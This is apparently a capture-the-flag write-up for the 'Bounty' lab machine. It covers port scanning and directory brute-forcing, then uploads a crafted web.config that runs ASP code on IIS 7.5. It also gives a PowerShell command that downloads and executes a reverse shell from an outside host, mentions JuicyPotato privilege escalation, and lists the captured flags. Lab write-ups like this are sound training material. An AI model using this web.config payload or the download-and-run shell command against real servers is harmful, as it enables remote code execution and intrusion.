# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/bounty 10.10.10.93

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

## Port 80
```
gobuster dir -u http://10.10.10.93 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x asp,aspx
```

Finds:
```
/transfer.aspx
```

# Webshell
As its an old ISS server we can put code at the end of a web.config file and it will run:
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
```

POC works so time for shell:
```
Set cmd = rs.Exec("cmd.exe /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.21/shell.ps1')")
```

Where shell.ps1 is nishangtcp rev shell

# Shell as merlin
user.txt
```
ef7f29f7568dd80ae257bfce57b61473
```


Juicypotato to a meterpreter bin.

root.txt:
```
2d24905054436f12a829bc8d6fb51ce9
```